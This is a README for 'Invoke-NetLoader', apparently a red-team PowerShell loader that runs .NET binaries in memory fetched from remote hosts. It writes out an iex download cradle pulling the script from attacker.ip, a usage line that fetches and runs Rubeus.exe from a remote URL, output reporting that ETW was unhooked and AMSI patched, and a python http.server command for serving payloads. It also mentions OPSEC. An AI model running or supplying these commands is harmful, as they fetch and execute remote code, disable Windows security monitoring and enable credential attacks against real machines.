# Invoke-NetLoader

Build with Visual Studio by using the folowing repository: https://github.com/Flangvik/NetLoader

Used the following script to pack: https://gist.github.com/Mayfly277/2e5f34a7e7f70798d1f19c0c35f9fa0e

This tool is capable to execute .NET binaries in memory from remote paths. 
With this little modification, the complete loader can execute in the memory, and not required to copy to the target machine.


## Usage

**Load the tool into memory**

```
# From Disk but it is not OPSEC safe
PS C:\> . .\Invoke-NetLoader.ps1

# Or load with a download cradle
iex (new-object system.net.webclient).downloadstring("http://attacker.ip/Invoke-NetLoader.ps1")
```

**Execute Actions**

```bash
# In this example case I loaded Rubeus from a remote path into memory and execute commands
 PS C:\workdir> Invoke-NetLoader -Command "-path http://attacker.ip/Rubeus.exe -args hash /password:almafa"

[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://192.168.40.128:8000/Rubeus.exe Arguments : hash /password:almafa

[*] Action: Calculate Password Hash(es)

[*] Input password             : almafa
[*]       rc4_hmac             : E2142B93EF3BC842800A3EF3B464C797

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```


**Serve Payloads on remote host**

```bash
└─$ python3 -m http.server 8000     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
target.ip - - [06/Aug/2025 10:29:43] "GET /Rubeus.exe HTTP/1.1" 200 -
```
